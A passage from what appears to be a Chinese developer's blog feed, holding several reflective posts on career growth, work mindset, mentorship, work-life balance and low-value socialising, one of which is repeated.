        <content type="html"><![CDATA[<p>去年的某个夜里，我躺在床上，辗转反侧，恍惚中陷入了对工作的沉思。</p><p>思考之际，一会儿有一句话从脑子里冒出来，我的手也没闲着，把那几句话给记录了下来。最近翻出来读了两遍，好像有几分道理，给大家分享一下：</p><p>1、<br><strong>有些事情，要选好时机再做。</strong>理解公司的发展战略，理解老板们的想法，搞清楚什么事情该做，什么事情必须现在做，什么事情是好事但是现在做还不是时机等等；说到底，就是搞清楚这件事给团队带来的价值，给团队带来了价值，才能体现这件事情的价值，才能体现你的价值。</p><p>2、<br><strong>很多事情看起来很难做，似乎凭个人力量搞不定，记得要相信自己的相信，坚持自己的坚持。</strong>工作中真正有技术门槛的活儿并不多，那些看似搞不定的问题，只要你心中认定能做好，往往最后你真的能做出来；说到底，还是心态问题，把心态摆正，用探索的方式去深入场景，用服务的态度去深入用户。</p><p>3、<br><strong>不要总想着让老板安排活儿，老板可能真的没事情安排给你做。</strong>团队规模大了之后，老板难以顾及到底下每个人，不管是老板疏忽还是确实没具体事情安排，总有那么几个人处于被「放养」的状态，如果自己不能正确理解「放养」，便会变成自我放纵；说到底，需要主动发现身边的问题，让自己成为 owner，而不是等待被安排。</p><p>4、<br><strong>你的心思，老板心里都清楚。</strong>你在团队的表现，抑或是成长的速度，老板们都看在眼里，同事们也看在眼里，干技术这行，基本还算公平竞争，不需要着急，你的价值最终一定会与团队位置相匹配；说到底，不要毛躁，沉下心来，要清楚自己想要什么，想发展成什么样，你如今的表现就是下一步的铺垫。</p><hr><p>工作之中，心态很重要，如果不能正视「舍」和「得」，就特别容易迷失在舍得之间；调整自己的视野，搞清楚自己到底要成为什么样的人，然后迎难而上，时间会证明一切。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>💰 价值驱动和利益驱动</title>
      <link href="/blog/2020/08/19/msapa8/"/>
      <url>/blog/2020/08/19/msapa8/</url>
      
        <content type="html"><![CDATA[<p>在做事情的时候，不可避免的会考虑一个问题，这件事情对我有什么好处？如果没有看得到的好处，我做还是不做？如果有好处，如何做可以放大好处？一旦长期这般思考问题，会陷入一个功利主义的思维惯性，导致<strong>事情的可见性价值直接影响一个人的思考和行动。</strong><br>**<br>我们不能说这是一个错误的价值观，毕竟生物都有趋利避害的本能，但一味地去追求个人利益最大化，那么就很容易滋生出错误的价值观。</p><h2 id="利益驱动，也要价值驱动"><a href="#利益驱动，也要价值驱动" class="headerlink" title="利益驱动，也要价值驱动"></a>利益驱动，也要价值驱动</h2><p>古代的土匪分为两种，一种是打家劫舍，占山为王，为了自己的一己私欲，可以无限地掠夺，不分对象，不分时机，这种土匪官府和百姓都深恶痛觉；另外一种是侠匪，他们专门找有钱的官员和富豪，劫富济贫，留下自己的口粮，剩下的都分给穷苦的人，这种土匪百姓喜欢，官府害怕。</p><p>两种土匪的心境是完全不一样的，前者是十足的个人利益驱动，而且为了个人利益可以不顾一切；而后者是社会普世价值观驱动，他们的目标是为了促成社会财富的平均分配，救民于水火。</p><p>凭着利益驱动，承担一些个人风险，可以有肉吃、有汤喝、有衣穿，但是<strong>做事情光靠利益驱动是不行的，还需要有正确的价值导向，这样才能吸引更多志趣相投的人进来</strong>。有的公司我们会说它有“狼性文化”，为了公司利益的最大化，做出的事情在结果上让人唏嘘，最后的结果呢？就是拿到了短期的效益，而失去了长期存在的价值。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>技术同学在业务中的成长</title>
      <link href="/blog/2020/08/17/growth-in-work/"/>
      <url>/blog/2020/08/17/growth-in-work/</url>
      
        <content type="html"><![CDATA[<p>上周看到有人提出了一个问题，大意是，“公司里头有很多部门，大部门的人员成长比小部门要好，可这也出现几个问题，一个是在大部门有机会去造大轮子，有更多场景，而小部门主要是在做业务；二是大部门内部晋升压力大，要是放到小部门可能早就升了，如何解释这些现象？”</p><h2 id="什么是业务？"><a href="#什么是业务？" class="headerlink" title="什么是业务？"></a>什么是业务？</h2><p>一个程序员走向成熟的标准是什么？<strong>我认为，是他能够看清技术的本质，不再为那些高大上的名词和所谓的权威言论而为之动容</strong>。抱着这样一个共识，我们接着去讨论，什么是轮子？</p><p>在公司里，可以看到两种类型的团队，一类是以技术专业为集合的团队，比如「端技术团队」，一类是以业务单元为集合的团队，比如「母婴行业团队」；前者工种单一，在大部门经常会产生这种团队，后者成员类型丰富，在大、小部门均较为常见，只不过在大部门中技术人员的汇报对象是同专业的技术 Leader，而在小部门很可能是业务 Leader。</p><p>当一个团队出现四五个类似的「母婴行业团队」时，就很容易出现以专业方向为集合的团队调整，原因是，<strong>团队为了避免大量的重复建设，需要通过对业务的理解向下抽象一层基础设施，为上层业务持续供血</strong>。而随着业务规模的不断扩大，这层基础设施可能仍然无法满足业务快速发展的需要，于是就有了更多层的抽象和聚合，以提升所有业务成员的单兵作战能力。</p><p><img src="/../blogimgs/2020/08/17/growth-in-work.png" alt="upload successful"></p><p>如上所示，我简单地画了一张图——团队因规模变大而几乎必然产生的面向专业方向的团队能力结构设计。聊到这里，我们再来看看，什么是轮子？</p><ul><li>做一个基础框架算不算轮子，算，针对代码的运行容器，设计一套程序的执行流程，最后将编程模式和 API 暴露给上层开发者；</li><li>造一个监控中心算不算轮子，当然算，一系列的数据收集加上一系列的数据分析，然后定义好数据消费者，将最后的数据消费掉；</li></ul><p>有的是小轮子，有的是大轮子，需要注意的是，<strong>这些轮子都放在「业务支撑」的下层，也就是说，如果轮子制造出来不能直接或者间接服务于业务，那么这些轮子就是失败的轮子。</strong></p><p>那么，造轮子是在做业务么？这个问题不言而喻，只是在一些成熟的团队，我们会看到，轮子的权重被抬得很高，甚至平行于业务的发展，轮子不仅仅会去满足团队内部的需要，还会考虑走向全公司，甚至走出公司进到社区，比如 React、Element UI、Material Design 等等，他们丰富了整个行业的生态，事实上，是支撑了更加广泛的业务。</p><h2 id="业务中的成长"><a href="#业务中的成长" class="headerlink" title="业务中的成长"></a>业务中的成长</h2><p>上面一大段，几乎是在阐释一个道理：<strong>轮子对业务来说十分重要，造轮子也是在做业务，只不过它需要更多的抽象，服务更大的体量。</strong>但是有个不争的事实是，作为一个技术人，在职场初期，技术上的成长比业务上的成长显得更有优势，所以大家都想有机会去造轮子，于是就出现了一个现状，在一个高速成长的团队中，轮子层出不穷，有的人在搞新轮子，有的人在优化已有的轮子，争取做大、做强，做到与业务并驾齐驱。</p><p>不管是大团队还是小团队，总有那么一部分人是需要直接服务于业务的，这些业务同学看到身边或者隔壁部门的同学有造轮子的机会，有一点眼馋也是说的过去的，这个声音必然存在。<strong>所以这里本质要聚焦的问题是，业务同学如何成长的问题。</strong><br>**<br>其实做业务的同学应该感到开心，因为你有机会冲到一线，直面企业和客户的核心问题。只不过有一个不够公平的现状是，公司通过产品去解决业务的问题，而产品的实际 Owner 通常并非技术人员，也就是说产品上拿到的结果很难直接算到技术人员的头上，本质矛盾是：<strong>技术拿到的是产品结果，却需要用产品背后的技术结果来评估自己的价值，这本身就是难以对等的。</strong><br>**<br>不过我们也需要换一个视角去看待这个问题。</p><p>踩在一堆轮子上，我们有足够的视野去分析业务的问题和解法。试想，让一个资深的轮子制造者跑到业务前线去打仗，他会遇到什么问题？彼时，他手里的这个轮子不再有效，只有当他在业务中遇到了跟自己轮子相关的问题时，他的效率才会高一点。业务开发人员，或者称之为产品工程师，他们的角色更像是车子发明家，有的人能够把各种轮子拼成一辆特斯拉，而有的人却只能拼装出一辆滑板车。针对产品工程师，这也给出了一个清晰的职责定义：<strong>产品工程师聚焦的内容应该是业务模型上，也就是手里的这辆车子上，不断去优化车子的引擎、制动、安全性和驾驶体验，这其实是个新的课题，也有丰富的场景。</strong><br>**<br>技术经过多年的探索已经有了很多固定的模式和模型，因此轮子的制造具备很强的确定性，轮子制造者们主要工作是根据业务的特征进行基础的适配和升级；而业务所面临的问题和挑战是不确定的，因为市场的不确定性和用户的不确定性，因此业务同学想向上突破，<strong>需要去探索业务中确定的部分，聚焦到新的业务模型上，为这个模型添砖加瓦，升级换代</strong>，这是一件有挑战的事情。</p><p>关于成长的问题，以前做过一些探讨，我把链接贴出来：</p><ul><li><a href="https://www.barretlee.com/blog/2016/07/11/learning-recent-years/">《谈谈我这三年在技术上的成长》</a>，2016 年</li><li><a href="https://www.barretlee.com/blog/2016/10/21/my-growth-at-alibaba/">《谈一谈我在阿里的成长》</a>，2016 年</li><li><a href="https://www.barretlee.com/blog/2019/03/18/tech-and-business-in-long-term-version/">《技术人的坚守》</a>，2019 年</li><li><a href="https://www.barretlee.com/blog/2019/06/09/growth-in-startup/">《新人在中小公司遇到的成长困境》</a>，2019 年</li></ul><p>感兴趣的可以去读一下，在这里不做过多的讨论。</p><h2 id="“我很强”的错觉"><a href="#“我很强”的错觉" class="headerlink" title="“我很强”的错觉"></a>“我很强”的错觉</h2><p>在规模庞大的团队待着的人，会看到很多服务规模超大的技术产品或者技术工具，因此容易产生一种“我很强”的错觉，事实上，是业务比较强，业务有市场才能促进业务下的技术层变得厚重。相反的，如果业务还在初期发展阶段，也容易产生一种“我较弱”的错觉。</p><p>对技术的评判不能单一地体现在业务的强弱上，事实上，每个人只要给予足够好的环境都可以得到快速的成长。有的人选择环境，有的人选择创造环境，做好分内的事情。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>忙着找方法，没时间做事情</title>
      <link href="/blog/2020/07/17/strategy/"/>
      <url>/blog/2020/07/17/strategy/</url>
      
        <content type="html"><![CDATA[<p>二狗子是个兴趣广泛的人，他特别喜欢琢磨新鲜玩意儿。</p><p>有一天二狗子突然想学习拍照了，于是买了一个 Sony 微单，发现默认摄像头是个定焦的，适合拍拍风景，于是又买了个 sigma 摄像头，拍拍人物，紧接着学习了一大堆光圈控制技能和拍摄技巧，然后把摄像机放到抽屉里吃灰了，至今没有拿出来 🤪</p><p>二狗子觉得之所以没有拍出好看的照片，还是相机过于笨重，不便于随身携带，而且操作起来特别麻烦，几个摄像头换来换去也容易把人搞烦躁。有一天他看到了同事买了个大疆无人机，经常在朋友圈发好看的视频。二狗子有点心动了，心想：“嗯，看起来还不错，这玩意儿能飞，肯定可以提起兴趣！”，于是二狗子又买了个大疆 Air。还别说，确实是个不错的玩具，嗖的一下就飞上了几千米的高空，啪的一下又稳稳地降了下来，还有各种跟随模式、环绕模式，确实可以拍出不少有趣的内容，于是二狗子把三块电池都足足地充满了电，然后放在抽屉里继续吃灰去了，至今没有拿出来 🤪</p><p>为什么大疆依然没有发挥作用呢？二狗子也反思过，大疆的续航能力太差了，而且组装、展开需要半天时间，再加上飞行技巧不是特别熟悉，在复杂的地形地域上也不敢乱飞，所以 Air 根本也没有太多用武之地。不过，在逛大疆官网的时候，二狗子瞥见到了一款十分有意思的产品，它叫做 osmo pocket，是一款小巧灵动的手持云台相机，“简直是 vlog 拍摄神器啊！”，二话不多说，买了一台回来了。这玩意儿确实不错，真的是小，而且配合手机可以拍出很多炫酷又有动感的视频，为了让可操行更强，二狗子还买齐了 osmo 的所有配件。果然，这一次不放在抽屉里吃灰了，而是……躺尸在了书包里 🤪</p><p>二狗子依然没有停止思考，为何单反、大疆无人机和手持迷你云台都没有被充分利用起来呢？不过这似乎也不是那么重要了，因为……已经有新的东西入了二狗子的法眼。</p><hr><p>二狗子的故事，每天都发生在我们的身边。我们对环境的要求很高，对自己的要求却很低，我们将自己武装到了牙齿，遇到了敌人却依然是缴械投降，我们忙着找方法，却忘记了做事情才是我们最原始的初心。</p><p>你可以看到这类人，当他们搞清楚了一件事情的始末以后，就再也不想把他做出来了，因为他热爱的是接触新事物的过程，一旦觉得自己可以完全掌控，那么事情本身就不再那么重要。</p><p>所以啊，**一定要搞清楚什么才是真正的价值，手段不是目的，手段只是达成目的的一种方法 **，不管用什么手段，都不要忘记最快地把事情落地才是最重要的，事情未落地，再漂亮的手段也不过是过眼云烟。</p><blockquote><p>注：本文的二狗子所经历的事情就是作者本人所经历的事情，**共勉 **🤪</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>忙着找方法，没时间做事情</title>
      <link href="/blog/2020/07/17/gqre0t/"/>
      <url>/blog/2020/07/17/gqre0t/</url>
      
        <content type="html"><![CDATA[<p>二狗子是个兴趣广泛的人，他特别喜欢琢磨新鲜玩意儿。</p><p>有一天二狗子突然想学习拍照了，于是买了一个 Sony 微单，发现默认摄像头是个定焦的，适合拍拍风景，于是又买了个 sigma 摄像头，拍拍人物，紧接着学习了一大堆光圈控制技能和拍摄技巧，然后把摄像机放到抽屉里吃灰了，至今没有拿出来 🤪</p><p>二狗子觉得之所以没有拍出好看的照片，还是相机过于笨重，不便于随身携带，而且操作起来特别麻烦，几个摄像头换来换去也容易把人搞烦躁。有一天他看到了同事买了个大疆无人机，经常在朋友圈发好看的视频。二狗子有点心动了，心想：“嗯，看起来还不错，这玩意儿能飞，肯定可以提起兴趣！”，于是二狗子又买了个大疆 Air。还别说，确实是个不错的玩具，嗖的一下就飞上了几千米的高空，啪的一下又稳稳地降了下来，还有各种跟随模式、环绕模式，确实可以拍出不少有趣的内容，于是二狗子把三块电池都足足地充满了电，然后放在抽屉里继续吃灰去了，至今没有拿出来 🤪</p><p>为什么大疆依然没有发挥作用呢？二狗子也反思过，大疆的续航能力太差了，而且组装、展开需要半天时间，再加上飞行技巧不是特别熟悉，在复杂的地形地域上也不敢乱飞，所以 Air 根本也没有太多用武之地。不过，在逛大疆官网的时候，二狗子瞥见到了一款十分有意思的产品，它叫做 osmo pocket，是一款小巧灵动的手持云台相机，“简直是 vlog 拍摄神器啊！”，二话不多说，买了一台回来了。这玩意儿确实不错，真的是小，而且配合手机可以拍出很多炫酷又有动感的视频，为了让可操行更强，二狗子还买齐了 osmo 的所有配件。果然，这一次不放在抽屉里吃灰了，而是……躺尸在了书包里 🤪</p><p>二狗子依然没有停止思考，为何单反、大疆无人机和手持迷你云台都没有被充分利用起来呢？不过这似乎也不是那么重要了，因为……已经有新的东西入了二狗子的法眼。</p><p>二狗子的故事，每天都发生在我们的身边。我们对环境的要求很高，对自己的要求却很低，我们将自己武装到了牙齿，遇到了敌人却依然是缴械投降，我们忙着找方法，却忘记了做事情才是我们最原始的初心。</p><p>你可以看到这类人，当他们搞清楚了一件事情的始末以后，就再也不想把他做出来了，因为他热爱的是接触新事物的过程，一旦觉得自己可以完全掌控，那么事情本身就不再那么重要。</p><p>所以啊，**一定要搞清楚什么才是真正的价值，手段不是目的，手段只是达成目的的一种方法 **，不管用什么手段，都不要忘记最快地把事情落地才是最重要的，事情未落地，再漂亮的手段也不过是过眼云烟。</p><blockquote><p>注：本文的二狗子所经历的事情就是作者本人所经历的事情，**共勉 **🤪</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>work-life balance</title>
      <link href="/blog/2020/07/10/work-life-balance/"/>
      <url>/blog/2020/07/10/work-life-balance/</url>
      
        <content type="html"><![CDATA[<p>最近几天加班比较多，起得晚，所以晨课停了几天，后续还是得恢复习惯，保持下去。</p><p>就聊一聊为啥最近比较忙吧。</p><p>转岗来蚂蚁金服的语雀团队差不多一个半月了，由于之前在淘宝团队呆过五年，换到阿里另一个大团队，就像是换了个项目组，没啥特别明显的高原反应。适应环境对我来说是一件再轻松不过的事情了，可能最大的不一样是，又有机会去接触一批优秀的同学，找到几个有意思的灵魂。</p><p>如果你好奇为什么我可以快速适应，下面也可以简单聊一下：</p><ul><li><strong>首先，从业务中找到归属感</strong>，大家认识你最快的渠道并不是面对面的聊天，在一个项目组里，大家了解你的最快渠道就是看你对业务的思考和贡献，所以我一直逼着自己去思考，业务当中的问题，以及我能做什么；</li><li><strong>找到痛点问题，快速解决，快速拿结果，</strong>一个项目发育到一定的周期后，一定有些年久失修的内容，而且不同的角色遇到的问题都会有差异，跟不同的角色都聊一聊，找到与自己岗位相关的部分，去解决它；</li><li><strong>最难的一点是去找到自己在团队中的位置，</strong>团队之中的所有人，各司其职，都有分派好的工作内容，你在团队中需要长期负责哪一块？这也是我近一个多月想的最多的问题。</li></ul><p>把这几件事情做好，需要耗费不好的精力，复杂的倒不是执行，而是找到对的事情，以及想到好的策略。</p><p>Work-life balance，这个问题在网上经常看到，也曾经有人问过我，当时也是话未多说，大家相觑一笑。作为一个身上扛着房贷、车贷，有家、有室、有父母需要赡养的 80 后、90 后，真的很难摆脱这个魔咒，朝九晚五的平衡简直就是一种奢望。</p><p><strong>所以重点应该还是放在工作的效率和生活的质量上。</strong>自从有了孩子以后，我周末是坚决不会打开电脑的，任何事情，只要不给我打电话，坚决不处理。这其实是对自己的要求变高了，如果周一到周五的工作不够完善，你是很难避免周末接到电话的。</p><p>记得在五年陈典礼上，一位阿里合伙人分享了他平衡生活和工作的经验，我觉得很有道理。<strong>想把生活和工作平衡好是很难的，我们能做的、应该做的，就是认真对待每一件事情，在工作的时候，好好工作，回到家里，好好陪陪家人，陪伴的时长我们无法保障，那就把陪伴的质量提高上去。</strong>好好带孩子，耐心的跟她玩，用她听得懂的话跟她解释所有的疑问，也让她走进大人的世界，看看爸爸妈妈在忙什么，了解的多了，她理解的也就多了。</p><p>最近看到一篇公众号文章<a href="https://mp.weixin.qq.com/s/w5iSYaP9Wwma_mQVekdaHA">《儿子出生后，我给自己立下三条育儿规矩》</a>，第二点提到的有效陪伴中，给出了一个有意思的思路，</p><blockquote><p>我给自己定下的第二条规矩就是，无论多忙，都要给孩子有效的陪伴。有效陪伴，指在陪孩子的过程中，父亲是专注的，而不是心无旁骛地玩手机，或处理其他事务。<br> <br><strong>具体来看，从孩子出生到上大学，我决定跟他一起，干100件“大事”。</strong></p><ul><li>选一个国家，跟孩子一起待上至少一个月，一起探索异国文化；</li><li>一起学习一门外语，可能是我熟悉的英语，也可能是我正在学的日语，也可能是我也不熟悉的西班牙语或法语；</li><li>传授一些记忆术给孩子，免得他走死记硬背的老路；</li><li>带孩子学会篮球（我最喜欢的户外运动），如果他也喜欢的话；</li><li>也可以是台球，我曾经最喜欢的室内运动；</li><li>跟孩子一起写一本书吧，写书其实没那么困难；</li><li>冥想，不知道孩子是否喜欢，但值得一起实践一次；</li><li>一起深度研读一本小说；</li><li>一起深度了解一部电影，而不是简单看一遍；</li><li>一起去医院逛一次，从产科，到肿瘤科，都走一遍；（估计要孩子十岁之后做这事）</li><li>一起去老家的坟墓走走，或者去城市的殡仪馆看看；（孩子十五岁后吧）</li><li>……</li></ul></blockquote><p>这是一种把陪伴进行量化的有效措施，我觉得非常好，我也打算这么做，虽然不能达到生活和工作的时间平衡，但是一定程度上可以有强烈的心理平衡。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>给自己找个导师</title>
      <link href="/blog/2020/07/01/find-yourself-a-mentor/"/>
      <url>/blog/2020/07/01/find-yourself-a-mentor/</url>
      
        <content type="html"><![CDATA[<p>端午节那几天，与国外的几个朋友约了两场 video chat，一场是输出，一场是半输入半输出，感觉还是挺不错的，沟通的过程中，还了解了不少 Facebook 的绩效考核制度和公司文化，说实在的，感觉跟自己还蛮契合，要不是暂时不想出国，可能都会尝试投投简历，😄</p><p>印象最深刻的是，Facebook 的 mentor 文化，<strong>什么是 mentor，可以简单地理解成引路人、导师，一般这个人在综合能力和视野上比你优秀一些，他可以在你职业发展之路上提供有用的建议和帮助</strong>。</p><p>事实上，我在阿里这几年，也在不断地为自己找 mentor，甚至也会尝试成为他人的 mentor，最近思考了一下，感觉整个操作还是不太规范化，缺乏更多的有效性。</p><h3 id="寻找导师"><a href="#寻找导师" class="headerlink" title="寻找导师"></a>寻找导师</h3><p>走进一个偌大的林子里，谁是老鸟，谁是雏儿，仅凭声音你是听不出来的，当你刚踏进一家公司的时候，人生地不熟，社交圈子就身边的几个人，如何去找到一位能够帮助你，并且愿意帮助你的人，似乎并不是那么容易。</p><p><strong>导师，并不需要他每天在你身边晃来晃去，保持一个中短期的低密度联系即可</strong>，3~6 个月时间，或者 1 年左右，因为你的阶段性成长和沉淀一般也需要这么长的周期拿到结果；当然，你也可以跟导师建立深厚的友谊，让这个关系保持得更久一些。</p><p>那么，如何去寻找适合自己的导师呢？</p><p><strong>首先，你的 Leader 一定是你最好的导师</strong>，你们是一个利益共同体，他有义务对你的职业发展负责，而你也可以毫无顾忌地向他发起求助，另外，你们之间最有可能发展出深刻的友谊关系。但是 Leader 的两个局限性是：</p><ul><li>他是局中人，你跟 Leader 之间发现的问题具有同质性，视野是有限的</li><li>他可能很忙，作为一个 Leader，需要对每个下属负责，他的精力很可能不够用，你不好一直打扰他</li></ul><p>如果你觉得 Leader 给你的帮助还不够的话，你需要跳出团队，从外部寻求帮助，哪些人可以成为你的导师呢？另外一个挖掘点是，<strong>你的 Leader（或者你熟悉的与 Leader 平级的 Leader）的人脉</strong>，他们在公司的时间一般会更久一些，接触过的人会比较多，而且他们已经积累了一定的信誉，<strong>可以帮助你引荐更多不错的人。</strong></p><p>有些公司的职级是公开的，你也可以<strong>从公司的通讯录中找到那些职级比自己高一两级的人，甚至高三四级的人</strong>，跟他们聊一聊，根据我的经验，大部分人还是比较乐意跟你聊的，但，是否能成为你的导师，还需要看你自己的表现，以及他们的时间安排。</p><p><strong>另外，你还可以从各种分享会、交流会、业务沟通会，甚至是技术文章、Code Review 的沟通等渠道找到优秀的人</strong>，聪明的你应该不乏找到这些人的方法，关键在于，找到了之后，怎么去建立联系，并保持长久的关系？</p><h3 id="保持关系"><a href="#保持关系" class="headerlink" title="保持关系"></a>保持关系</h3><p>优秀的人更喜欢跟优秀的人在一起，我想这个道理，大家都是明白的，如果你想找到一位优秀的 mentor，你首先需要做的一件事情就是，表现出自己有足够的潜力成为优秀的人，因为谁也不想去尝试把一块烂泥巴扶上墙。值得注意的是，<strong>导师也只是个助力点火的角色，不要想着有了导师，就觉得自己可以“躺着成长”，你还是得奔跑，甚至更快速、更猛烈地奔跑</strong>。</p><p><strong>当发现自己成长的速度太慢的时候，需要先做一个自我诊断</strong>，列出自己的职业规划或者项目计划，对内容做分析，然后去比对期望值，看看自己还缺乏哪方面的知识、经验和能力。拿着你的分析，再去寻找导师寻求帮助。</p><p>当然，职场新人可能连自己想要什么都不知道，这个时候也可以去找导师聊一聊，<strong>询问一下那些优秀的人的成长经历是怎么样的，如果你也想成为那样的人，需要经历哪些阶段</strong>，慢慢的去找到适合自己的职业规划。</p><p>导师持续向你输出帮助的动力在于，<strong>他期望通过对你的帮助让你飞快地提升，一方面提升他的影响力，一方面从中获得成就感</strong>。Facebook 在这方面拿到的成果是可以纳入个人考核的，所以你会发现，在这家公司，你不用特别主动地去找 mentor，也会有 mentor 主动上门询问你是需要获得帮助，这样的氛围是不是挺有意思的~ 😄</p><p>给自己制定一个 3 个月到半年的详细规划，其中包含明确的目标、里程碑计划、每个阶段的衡量指标，以及每个阶段你可能会遇到的问题和风险，<strong>拿着这个规划，每半月或者一个月与导师对焦，让他给你的项目、个人发展、职业规范等各方面提出建议</strong>，在这个过程中，可以适当聊聊工作之外的事情，不断加深与导师之间的关系。</p><h3 id="导师的职责"><a href="#导师的职责" class="headerlink" title="导师的职责"></a>导师的职责</h3><p>优秀且有社交欲望的导师，会同时去给好多人提供帮助，这对导师来说，也是一种历练，有一个职业叫做 career coach，跟导师的工作内容就比较贴切了，只不过 career coach 是收费的，你跟他们之间通过物质利益输送保持稳定关系，这对发展潜力不够突出的人来说，或许是个快速找到导师的渠道。</p><p>有个词叫做因地制宜，什么样的土壤培育出什么样的种子，有的导师会习惯性地将你引导到他熟悉的路上，但这条路可能并不适合你，而导师的说服力一般都会特别强，在跟他沟通的过程中，你似乎很难拒绝不走他为你选择的路，这一点就十分尴尬了。</p><p>所以，<strong>作为导师，也需要在沟通中掌握更多的信息，结合学生的个人需求和个人特征，在长期目标上达成一致性。</strong>当然，有的时候，导师的判断是对的，只不过学生不想踏出舒适区，这就需要更多的情感支撑，帮助对方走过难关。</p><p>导师，本身就是个挺难驾驭的角色，并不是人人都能做好。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结#"></a>小结#</h2><p>开篇提到自己也有很多的操作不规范，更多的是过去给自己找导师的时候，缺少更多的规划性，都是讨论大方向问题，或者情感的倾诉，导师在我这里更多的是安慰剂或者强心剂，并没有起到长期辅助个人成长的作用。这一点是需要改进的。</p><p>写的匆忙，这次的早课分享就写到这里吧，大家有啥疑问可以提出来，后续再做更多的讨论。</p><p>以上，希望对有帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>今天你无效社交了么？</title>
      <link href="/blog/2020/06/28/useless-social-work/"/>
      <url>/blog/2020/06/28/useless-social-work/</url>
      
        <content type="html"><![CDATA[<p>不知道有多少人跟我一样，觉得社交——跟别人沟通和交流——是一件很有趣的事情，因此在过去的几年里，我花了大量时间在社交这件事情上。最近半年我在反思，我为什么要去社交？为什么我需要花费这么多时间去社交？我有多少时间的社交是有价值的？</p><h3 id="识别无效社交"><a href="#识别无效社交" class="headerlink" title="识别无效社交"></a>识别无效社交</h3><p>在网络上找到了一段对无效社交的定义：</p><blockquote><p>无效社交是指那种无法给你的精神、感情、工作、生活带来任何愉悦感和进步的社交活动。</p></blockquote><p>这种定义还是过于书面化，而且它并不准确，任何社交行为都会对人产生正面或者负面的影响，而这个影响到底是促使人进步还是毫无效果是很难直接衡量的。这就好比有人对你说，“打游戏、看小说是在浪费时间，没有意义”，事实上，你徜徉在游戏和小说的世界里可以不断地丰富自己的想象力，这难道不是促进作用么 🐶。</p><p><strong>社交的过程是一个信息交换的过程，如果在彼此的信息交换过程中，可以给对方带来一些新思路，或者解决了一些实际问题，我认为这就是有效的社交。</strong>简单来说，有效的社交就是会产生价值增量，只不过这里的增量有大也有小。</p><p>有了互联网以后，人们的信息触达面更广泛了，能够收到的反馈也会更多，当信息量达到一定程度后，我们就需要投入大量的时间去聆听、阅读、回复以及其他交互，这个过程中充斥了无效社交。为了分析在哪些环节会长生无效社交，我们不妨将社交行为做一个简单的分类：</p><p><img src="/../blogimgs/2020/06/28/useless-socialization.png" alt="upload successful"></p><p>线上的社交分为阻塞式和异步式，比如打电话、发视频以及“钉一下”功能，基本都要求我们放下手头的工作，而微信和邮件都是可以换个时间去阅读和回复的。从社交的对象数量也可以分为，一对一，一对多和多对多等模式。</p><p>我们日常的社交行为十分丰富，举几个社交中经常遇到的的场景：</p><ul><li>在一个水军群里，看别人扯淡，你也凑合进去发表几句，聊着聊着还聊起劲了</li><li>看到一个人很厉害的样子，跑过去寒暄几句，凑个脸熟</li><li>在朋友圈宣泄几句，收到了不少人的反馈和点赞，接着在评论区跟人唠起来</li><li>在知乎看到了一个杠精，觉得他的观点太幼稚，跑过去义正言辞地跟人家聊&#x2F;怼了起来</li><li>过年了，写一条祝福语，给所有的认识的不认识的朋友都发一次</li><li>……</li></ul><p>注意，以上场景，我并没有说它是无效社交。那么，接下来就要给出无效社交的定义了。</p><p><strong>每个人心中都有一把尺子，这个尺子可以衡量一件事物的价值，你觉得有意义的事情他觉得无意义，反之亦然，所以无效社交就是先确定好心中这把尺子的度量衡，在价值上低于度量衡的便是无效社交。</strong><br>**<br>你可以把自己心中的尺子拿出来，对着上面几个场景量一量，就可以量出你心中的无效社交。<strong>当然，这么做会显得有些功利主义，但是你得搞清楚，如果无效社交占据了你大量的时间，那么可以真正被用来做事情的时间便会越来越少。</strong></p><h3 id="提升社交的质量"><a href="#提升社交的质量" class="headerlink" title="提升社交的质量"></a>提升社交的质量</h3><p>靠自律，可以减少一定的无效社交，比如你可以不混水军群，不去吐槽，不做键盘侠，少接触人等等，但是这么做也会让自己变得很无趣，而且失去了很多原有的高质量社交场景。该如何做呢？</p><p><strong>建议 首先，你要想清楚，为什么需要社交？</strong>是因为想获得某个人的帮助，还是想泡上哪个女孩，是为了扩大自己的社交圈，还是为了变成一个健谈的人？社交可以分为主动社交和被动社交，大部分的社交行为，都是双方各占据一个角色，</p><ul><li>如果你是主动社交，你需要想清楚，你期望他帮助你解决什么问题，他能够帮助么？他愿意帮助么？</li><li>如果你是被动社交，你需要想清楚，你能帮助他么？你需要帮助他么？是不是还会衍生会延续的社交内容？</li></ul><p>当然，以上都是趋于功利主义的分析，但<strong>这样的分析方式，可以让你的社交更具备目的性，心怀“互利共赢”四个字，这样才能产生更大的有效性社交。</strong><br>**<br><strong>建议 然后，你需要思考，怎样的社交是最有效率的？</strong>我们经常可以看到这样的场景：</p><ul><li>寒暄了半天，结果跑题了，扯了半天陈年往事，正准备聊正事儿，人家说要去吃个午饭了</li><li>遇到了问题，找到 A，结果让去找 B，找了 B 让去找 C，找了一圈，最后还是自己去解决的</li></ul><p>直击痛点和重点是一门艺术，它能够反映一个人的抽象能力和分析能力。有效的社交需要过滤信息杂音，彼此之间最快达到共识；有效社交也需要你擦亮眼睛，看清楚人和事之间的枢纽关系，找到最合适的对象沟通。</p><p><strong>建议 为你的下次社交活动埋个好的伏笔。</strong>人情是个很好的东西，今天你帮了我，明天我就会帮助你，大家在相互帮助中让自己期望达成的事情更有效率地达成，本身就是有利于社会发展的好事。</p><h3 id="小结"><a href="#小结" class="headerlink" 